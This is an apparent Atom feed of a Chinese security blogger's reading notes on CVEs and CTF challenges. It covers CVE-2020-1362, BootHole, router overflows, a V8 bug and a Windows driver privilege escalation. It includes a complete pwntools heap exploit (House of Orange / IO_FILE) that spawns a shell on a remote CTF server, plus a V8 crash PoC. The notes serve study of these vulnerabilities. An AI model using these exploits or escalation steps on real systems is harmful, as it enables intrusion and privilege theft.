<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ssj&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/Cracke-S-J/"/>
  <updated>2020-08-04T14:50:32.787Z</updated>
  <id>https://github.com/Cracke-S-J/</id>
  
  <author>
    <name>ssj</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>FANS: Fuzzing Android Native System Services via Automated Interface Analysis</title>
    <link href="https://github.com/Cracke-S-J/2020/08/04/FANS-Fuzzing-Android-Native-System-Services-via-Automated-Interface-Analysis/"/>
    <id>https://github.com/Cracke-S-J/2020/08/04/FANS-Fuzzing-Android-Native-System-Services-via-Automated-Interface-Analysis/</id>
    <published>2020-08-04T08:04:38.000Z</published>
    <updated>2020-08-04T14:50:32.787Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.usenix.org/system/files/sec20fall_liu_prepub.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/sec20fall_liu_prepub.pdf</a></p><p><a href="https://github.com/iromise/fans">https://github.com/iromise/fans</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.usenix.org/system/files/sec20fall_liu_prepub.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.usenix.org/system/files
      
    
    </summary>
    
    
      <category term="Fuzz" scheme="https://github.com/Cracke-S-J/categories/Fuzz/"/>
    
    
      <category term="Fuzz" scheme="https://github.com/Cracke-S-J/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>一些CVE和其它安全相关文章阅读整理（三）</title>
    <link href="https://github.com/Cracke-S-J/2020/07/28/%E4%B8%80%E4%BA%9BCVE%E5%92%8C%E5%85%B6%E5%AE%83%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E6%95%B4%E7%90%86%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://github.com/Cracke-S-J/2020/07/28/%E4%B8%80%E4%BA%9BCVE%E5%92%8C%E5%85%B6%E5%AE%83%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E6%95%B4%E7%90%86%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-07-28T13:08:20.000Z</published>
    <updated>2020-08-05T14:09:23.238Z</updated>
    
    <content type="html"><![CDATA[<p>7.28 – 今，ssj学习笔记。</p><h2 id="CVE-2020-1362漏洞分析"><a href="#CVE-2020-1362漏洞分析" class="headerlink" title="CVE-2020-1362漏洞分析"></a>CVE-2020-1362漏洞分析</h2><p>WalletService 服务是 windows 上用来持有钱包客户端所使用的对象的一个服务，只存在 windows 10 中。</p><p>CVE-2020-1362 是 WalletService 在处理 CustomProperty 对象的过程中出现了越界读写，此漏洞可以导致攻击者获得管理员权限，漏洞评级为高危。</p><p>是华南理工Q4n师傅他们挖的，膜膜膜。</p><p>CustomProperty对象的Group的get和set没有边界检查，可以越界读写，利用思路主要如下：</p><ul><li>CustomProperty::SetLabel()修改string里的beg和end指针，可以aaw；</li><li>伪造虚表；</li><li>提权，找程序中执行LoadLibrary()的地方，改成load我们的dll，会执行DllMain()，实现提权；</li><li>在这里的方法是，把虚表的某个地址覆盖成dxgi.dll里的ATL::CComObject::`vector deleting destructor()，这个函数调用的LoadLibraryExW()会使用一个全局变量作为想要加载的dll的路径。</li></ul><h2 id="Geekpwn部分题解"><a href="#Geekpwn部分题解" class="headerlink" title="Geekpwn部分题解"></a>Geekpwn部分题解</h2><p><a href="https://www.anquanke.com/post/id/211602" target="_blank" rel="noopener">真·部分题解</a></p><h3 id="BabyPwn"><a href="#BabyPwn" class="headerlink" title="BabyPwn"></a>BabyPwn</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/</a></p><p>数组index可以输入负的，直接一发入魂利用stdin拿到libc_addr，然后基本就利用ctfwiki - pwn - IO_FILE Related里的知识。</p><p>exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">remote_addr = <span class="string">"110.80.136.39"</span></span><br><span class="line">remote_port = <span class="number">14546</span></span><br><span class="line"></span><br><span class="line">uselibc = <span class="number">2</span> <span class="comment">#0 for no,1 for i386,2 for x64</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">haslibc = <span class="number">1</span></span><br><span class="line">atta = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">pc = <span class="string">'./chall'</span></span><br><span class="line">pwn_elf = ELF(pc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_64</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    struct = p64(_flags) + \</span><br><span class="line">            p64(_IO_read_ptr) + \</span><br><span class="line">            p64(_IO_read_end) + \</span><br><span class="line">            p64(_IO_read_base) + \</span><br><span class="line">            p64(_IO_write_base) + \</span><br><span class="line">            p64(_IO_write_ptr) + \</span><br><span class="line">            p64(_IO_write_end) + \</span><br><span class="line">            p64(_IO_buf_base) + \</span><br><span class="line">            p64(_IO_buf_end) + \</span><br><span class="line">            p64(_IO_save_base) + \</span><br><span class="line">            p64(_IO_backup_base) + \</span><br><span class="line">            p64(_IO_save_end) + \</span><br><span class="line">            p64(_IO_marker) + \</span><br><span class="line">            p64(_IO_chain) + \</span><br><span class="line">            p32(_fileno)</span><br><span class="line">    struct = struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    struct += p64(_lock)</span><br><span class="line">    struct = struct.ljust(<span class="number">0xc0</span>,<span class="string">"\x00"</span>)</span><br><span class="line">    struct += p64(_mode)</span><br><span class="line">    struct = struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> uselibc == <span class="number">2</span>:</span><br><span class="line">    context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">"i386"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> uselibc ==<span class="number">2</span> <span class="keyword">and</span> haslibc == <span class="number">0</span>:</span><br><span class="line">    libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> uselibc == <span class="number">1</span> <span class="keyword">and</span> haslibc == <span class="number">0</span>:</span><br><span class="line">        libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> haslibc:</span><br><span class="line">    <span class="comment">#p = elf.process(env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)</span></span><br><span class="line">        p = process(pc,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(pc)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">0</span>:</span><br><span class="line">    p = remote(remote_addr,remote_port)</span><br><span class="line">    <span class="keyword">if</span> haslibc:</span><br><span class="line">        libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Description:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    show(<span class="number">-5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'stdin'</span>]</span><br><span class="line">    lg(<span class="string">'libc'</span>,libc.address)</span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io_list_all = libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">    <span class="comment">#show(-13)</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'a'</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'b'</span>,<span class="string">'b'</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'c'</span>,p64(<span class="number">0x11</span>)*<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'c'</span>,p64(<span class="number">0x11</span>)*<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'c'</span>,p64(<span class="number">0x11</span>)*<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'c'</span>,p64(<span class="number">0x11</span>)*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'a'</span>,<span class="string">''</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Description:'</span>)</span><br><span class="line">    heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    lg(<span class="string">'heap'</span>,heap_addr)</span><br><span class="line">    add(<span class="number">1</span>,<span class="string">'b'</span>,<span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'a'</span>,payload)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    fake_fd = <span class="number">0</span></span><br><span class="line">    fake_bk = io_list_all - <span class="number">0x10</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">    payload += pack_file_64(_flags = u64(<span class="string">'/bin/sh\0'</span>),</span><br><span class="line">                _IO_read_ptr = <span class="number">0x61</span>,</span><br><span class="line">                _IO_read_end = fake_fd,</span><br><span class="line">                _IO_read_base = fake_bk,</span><br><span class="line">                _IO_write_base = <span class="number">2</span>,</span><br><span class="line">                _IO_write_ptr = <span class="number">3</span>)</span><br><span class="line">    vtalbe = heap_addr + <span class="number">0xe0</span></span><br><span class="line">    payload += p64(vtalbe)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(system) + p64(system)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'a'</span>,payload)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>,<span class="string">'a'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size:'</span>,str(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">hack()</span><br></pre></td></tr></table></figure><h3 id="One-Line-JS"><a href="#One-Line-JS" class="headerlink" title="One Line JS"></a>One Line JS</h3><h2 id="实战栈溢出：三个漏洞搞定一台路由器"><a href="#实战栈溢出：三个漏洞搞定一台路由器" class="headerlink" title="实战栈溢出：三个漏洞搞定一台路由器"></a>实战栈溢出：三个漏洞搞定一台路由器</h2><p><a href="https://paper.seebug.org/269/" target="_blank" rel="noopener">https://paper.seebug.org/269/</a></p><p>三个漏洞是：</p><ul><li>snprintf使用不当造成的内存泄露，空闲堆会泄露出libc地址；</li><li>ini配置注入，利用换行注入，新注入的<code>server_addr</code>会覆盖前面配置；</li><li>重启Xware时会重新加载ini配置，这里还有个栈溢出，strcpy造成的典型栈溢；</li></ul><p>利用思路主要是：</p><ul><li>信息泄露出libc_addr；</li><li>找到libc中系列gadget，填入ini配置中；</li><li>重启Xware触发栈溢出（PS:这些arm/mips的路由器中通常没有ASLR），pwned!</li></ul><h2 id="Grubbing-Secure-Boot-the-Wrong-Way-CVE-2020-10713"><a href="#Grubbing-Secure-Boot-the-Wrong-Way-CVE-2020-10713" class="headerlink" title="Grubbing Secure Boot the Wrong Way: CVE-2020-10713"></a>Grubbing Secure Boot the Wrong Way: CVE-2020-10713</h2><p><a href="https://capsule8.com/blog/grubbing-secure-boot-the-wrong-way-cve-2020-10713/" target="_blank" rel="noopener">https://capsule8.com/blog/grubbing-secure-boot-the-wrong-way-cve-2020-10713/</a></p><p><a href="https://www.zdnet.com/article/boothole-attack-impacts-windows-and-linux-systems-using-grub2-and-secure-boot/" target="_blank" rel="noopener">https://www.zdnet.com/article/boothole-attack-impacts-windows-and-linux-systems-using-grub2-and-secure-boot/</a></p><h3 id="什么是GRUB"><a href="#什么是GRUB" class="headerlink" title="什么是GRUB"></a>什么是GRUB</h3><p>GNU GRUB（简称“GRUB”）是一个来自GNU项目的启动引导程序。 GRUB是多启动规范的实现，它允许用户可以在计算机内同时拥有多个操作系统，并在计算机启动时选择希望运行的操作系统。 GRUB可用于选择操作系统分区上的不同内核，也可用于向这些内核传递启动参数。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>GRUB安全启动的时候需要验证所有固件是否安全，启动过程如下：</p><ol><li>固件加载包含可信任证书（shim）的smol first-stage bootloader binary;</li><li>Shim加载GRUB二进制文件（另一个引导程序），并使用证书对其进行验证;</li><li>GRUB加载位于grub.cfg（在本例中为Chekov的配置文件）中的所有必需配置，该配置指向可以加载内核映像的位置；</li><li>GRUB通过存储在固件的信任数据库（分别为db和dbx，分别是授权和禁止的签名数据库）中的密钥来验证内核；</li><li>GRUB将控制权移交给内核；内核启动操作系统。</li></ol><p>在第三步的时候，使用通过flex和bison生成的解释器来读文件，当配置文件过大，可以栈缓冲区溢出；直接溢，它没有ASLR等缓解措施。</p><p>利用条件是，用户有足够高的权限、机器会重启。</p><h3 id="产生影响"><a href="#产生影响" class="headerlink" title="产生影响"></a>产生影响</h3><p>The company estimates that every Linux distribution is impacted by this vulnerability, as all use GRUB2 bootloaders that read commands from an external grub.cfg file.</p><h2 id="Unpatchable-Secure-Enclave-Processor-SEP-chip-vulnerability-in-iOS"><a href="#Unpatchable-Secure-Enclave-Processor-SEP-chip-vulnerability-in-iOS" class="headerlink" title="Unpatchable Secure Enclave Processor (SEP) chip vulnerability in iOS"></a>Unpatchable Secure Enclave Processor (SEP) chip vulnerability in iOS</h2><p><a href="https://androidrookies.com/team-pangu-demonstrates-unpatchable-secure-enclave-processor-sep-chip-vulnerability-in-ios/" target="_blank" rel="noopener">https://androidrookies.com/team-pangu-demonstrates-unpatchable-secure-enclave-processor-sep-chip-vulnerability-in-ios/</a></p><p>SEP (Secure Enclave Processor) is an independent coprocessor that provides an extra layer of security to Apple iPhones and iPads.</p><p>硬件漏洞，可以控制寄存器，绕过安全措施，具体文中也没说咱也不知道。</p><h2 id="我又来看浏览器了"><a href="#我又来看浏览器了" class="headerlink" title="我又来看浏览器了"></a>我又来看浏览器了</h2><h3 id="Chromium一个洞"><a href="#Chromium一个洞" class="headerlink" title="Chromium一个洞"></a>Chromium一个洞</h3><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1072171" target="_blank" rel="noopener">Issue 1072171: Security: missing the -0 case when intersecting and computing the Type::Range in NumberMax</a></p><p>poc:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> confused;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">-0.0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        confused = <span class="built_in">Math</span>.max(<span class="number">-1</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    confused[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">crash();</span><br><span class="line">%OptimizeFunctionOnNextCall(crash);</span><br><span class="line">crash();</span><br></pre></td></tr></table></figure><p>In the cases that, for example, rhx is Type::MinusZero the following code:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rhs = Type::Intersect(rhs, cache_-&gt;kInteger, zone());</span><br></pre></td></tr></table></figure><p>The aforementioned code will wrongly remove the Type::MinusZero and therefore rhs.IsNone() will yield true on the following lines of code:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> min = <span class="built_in">std</span>::max(lhs.IsNone() ? -V8_INFINITY : lhs.Min(),</span><br><span class="line">                       rhs.IsNone() ? -V8_INFINITY : rhs.Min());</span><br><span class="line"><span class="keyword">double</span> max = <span class="built_in">std</span>::max(lhs.IsNone() ? -V8_INFINITY : lhs.Max(),</span><br><span class="line">                       rhs.IsNone() ? -V8_INFINITY : rhs.Max());</span><br><span class="line">type = Type::Union(type, Type::Range(min, max, zone()), zone());</span><br></pre></td></tr></table></figure><p>This will lead to cases in which the Type::Range(min, max, zone()) is wrongly computed due to the first run being Range(-1, -1) and the next Typer run, before crashing, starting on Range(1, 1).</p><h3 id="Speculation-in-JavaScriptCore"><a href="#Speculation-in-JavaScriptCore" class="headerlink" title="Speculation in JavaScriptCore"></a>Speculation in JavaScriptCore</h3><p><a href="https://webkit.org/blog/10308/speculation-in-javascriptcore/" target="_blank" rel="noopener">Speculation in JavaScriptCore</a></p><p>JavaScriptCore has four tiers:</p><ul><li>The LLInt, or low-level interpreter, which is an interpreter that obeys JIT compiler ABI. It runs on the same stack as the JITs and uses a known set of registers and stack locations for its internal state.</li><li>The Baseline JIT, also known as a bytecode template JIT, which emits a template of machine code for each bytecode instruction without trying to reason about relationships between multiple instructions in the function. It compiles whole functions, which makes it a method JIT. Baseline does no OSR speculations but does have a handful of diamond speculations based on profiling from the LLInt.</li><li>The DFG JIT, or data flow graph JIT, which does OSR speculation based on profiling from the LLInt, Baseline, and in some rare cases even using profiling data collected by the DFG JIT and FTL JIT. It may OSR exit to either baseline or LLInt. The DFG has a compiler IR called DFG IR, which allows for sophisticated reasoning about speculation. The DFG avoids doing expensive optimizations and makes many compromises to enable fast code generation.</li><li>The FTL JIT, or faster than light JIT, which does comprehensive compiler optimizations. It’s designed for peak throughput. The FTL never compromises on throughput to improve compile times. This JIT reuses most of the DFG JIT’s optimizations and adds lots more. The FTL JIT uses multiple IRs (DFG IR, DFG SSA IR, B3 IR, and Assembly IR).</li></ul><h2 id="Issue-2035-iOS-PPL-bypass-due-to-incorrect-argument-verification-in-pmap-protect-options-internal-and-pmap-remove-options-internal"><a href="#Issue-2035-iOS-PPL-bypass-due-to-incorrect-argument-verification-in-pmap-protect-options-internal-and-pmap-remove-options-internal" class="headerlink" title="Issue 2035: iOS: PPL bypass due to incorrect argument verification in pmap_protect_options_internal() and pmap_remove_options_internal()"></a>Issue 2035: iOS: PPL bypass due to incorrect argument verification in pmap_protect_options_internal() and pmap_remove_options_internal()</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2035" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=2035</a></p><h2 id="One-Byte-to-rule-them-all"><a href="#One-Byte-to-rule-them-all" class="headerlink" title="One Byte to rule them all"></a>One Byte to rule them all</h2><p><a href="https://googleprojectzero.blogspot.com/2020/07/one-byte-to-rule-them-all.html?m=1" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2020/07/one-byte-to-rule-them-all.html?m=1</a></p><h2 id="Technical-analysis-CVE-2020-15654-and-a-history-of-Firefox-“Browser-Lock”-bugs"><a href="#Technical-analysis-CVE-2020-15654-and-a-history-of-Firefox-“Browser-Lock”-bugs" class="headerlink" title="Technical analysis: CVE-2020-15654 and a history of Firefox “Browser Lock” bugs"></a>Technical analysis: CVE-2020-15654 and a history of Firefox “Browser Lock” bugs</h2><p><a href="https://news.sophos.com/en-us/2020/08/03/technical-analysis-cve-2020-15654-and-a-history-of-firefox-browser-lock-bugs/?cmp=30728" target="_blank" rel="noopener">https://news.sophos.com/en-us/2020/08/03/technical-analysis-cve-2020-15654-and-a-history-of-firefox-browser-lock-bugs/?cmp=30728</a></p><p>主要讲了“浏览器前端漏洞”，恶意网站DoS、欺骗，自定义光标 –解决措施–&gt; 黄条警告。</p><h2 id="Exploiting-SKYSEA-Activity-Monitor"><a href="#Exploiting-SKYSEA-Activity-Monitor" class="headerlink" title="Exploiting SKYSEA Activity Monitor"></a>Exploiting SKYSEA Activity Monitor</h2><p><a href="https://acru3l.github.io/2020/08/03/exploiting-activity-monitor-driver/" target="_blank" rel="noopener">Exploiting SKYSEA Activity Monitor</a></p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>因为下面这个原因，所以有个地方的地址是用户空间可以控制的；</p><blockquote><p>METHOD_NEITHER<br>Specifies neither buffered nor direct I/O. The I/O manager does not provide any system buffers or MDLs. The IRP supplies the user-mode virtual addresses of the input and output buffers that were specified to DeviceIoControl or IoBuildDeviceIoControlRequest, without validating or mapping them.</p></blockquote><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>漏洞点有任意地址写为null；</li><li>想要转化为rrw，要控制_d或_q；</li><li>d取决于SkyAMDrv.sys中三个全局变量，two DWORD integers X, Y and a pointer P to a data structure. These three variables are placed in this order: X, Y, and P are at SkyAMDrv+1BA28, SkyAMDrv+1BA2C, and SkyAMDrv+1BA30 respectively. 假设P指向G结构，_d的值跟G+44有关；</li><li>覆盖P为用户空间可控的地址，那么就可以在用户空间伪造G，然后控制G+44就可以控制_d，从而rrw；</li><li>有了rrw，we can leak the address of an access token in the Kernel space like you do with Process Explorer included in the Sysinternals Suite. Then we can overwrite the privileges fields in the access token with 0xffffffffffffffff. See for example, @alxbl’s <a 